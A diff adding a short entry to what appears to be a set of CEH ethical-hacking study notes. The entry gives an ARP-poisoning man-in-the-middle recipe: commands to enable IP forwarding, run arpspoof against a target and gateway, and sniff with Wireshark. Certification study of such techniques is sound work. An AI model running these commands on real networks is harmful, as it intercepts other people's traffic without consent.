@@ -10,3 +10,34 @@ https://github.com/infovault-Ytube/CEH-Practical-Notes
 https://github.com/cmuppin/CEH
 
 
+-----------------------------------------------------------------------------------------------
+
+
+
+
+
+
+
+ARP poisning (MITM)
+
+
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+arpspoof -i <interface>   -t <target>  -r <host>
+
+#use wireshark for sniff
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
